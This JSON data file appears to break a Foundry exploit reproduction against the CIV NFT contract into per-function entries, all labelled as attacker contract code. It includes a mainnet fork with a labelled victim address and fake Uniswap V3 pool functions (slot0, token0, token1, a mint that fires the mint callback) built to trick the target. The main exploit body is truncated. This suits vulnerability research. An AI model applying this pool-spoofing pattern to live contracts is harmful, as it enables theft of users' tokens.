[
  {
    "contract/interface": "CIVNFTTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "CIVNFTTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CIVNFTTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CIVNFTTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CIVNFTTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "CIVNFTTest",
    "source_type": "attacker_contract",
    "function_name": "mint",
    "original_code": "    function mint(\n        address recipient,\n        int24 tickLower,\n        int24 tickUpper,\n        uint128 amount,\n        bytes calldata data\n    ) external returns (uint256 amount0, uint256 amount1) {\n        callUniswapV3MintCallback();\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CIVNFTTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 17_649_875);\n        cheats.label(address(CIV), \"CIV\");\n        cheats.label(address(WETH), \"WETH\");\n        cheats.label(CIVNFT, \"CIVNFT\");\n        cheats.label(victim, \"victim\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CIVNFTTest",
    "source_type": "attacker_contract",
    "function_name": "slot0",
    "original_code": "    function slot0() external pure returns (Slot0 memory) {\n        return Slot0({\n            sqrtPriceX96: 590_212_530_842_204_246_875_907_781,\n            tick: -97_380,\n            observationIndex: 0,\n            observationCardinality: 1,\n            observationCardinalityNext: 1,\n            feeProtocol: 0,\n            unlocked: true\n        });\n",
    "description": ""
  },
  {
    "contract/interface": "CIVNFTTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CIVNFTTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CIVNFTTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CIVNFTTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "CIVNFTTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CIVNFTTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CIVNFTTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        emit log_named_decimal_uint(\"Attacker CIV balance before exploit\", CIV.balanceOf(address(this)), CIV.decimals());\n",
    "description": ""
  },
  {
    "contract/interface": "CIVNFTTest",
    "source_type": "attacker_contract",
    "function_name": "tickSpacing",
    "original_code": "    function tickSpacing() external pure returns (int24) {\n        return 60;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CIVNFTTest",
    "source_type": "attacker_contract",
    "function_name": "token0",
    "original_code": "    function token0() external view returns (address) {\n        return address(CIV);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CIVNFTTest",
    "source_type": "attacker_contract",
    "function_name": "token1",
    "original_code": "    function token1() external view returns (address) {\n        return address(WETH);\n    }\n\n",
    "description": ""
  }
]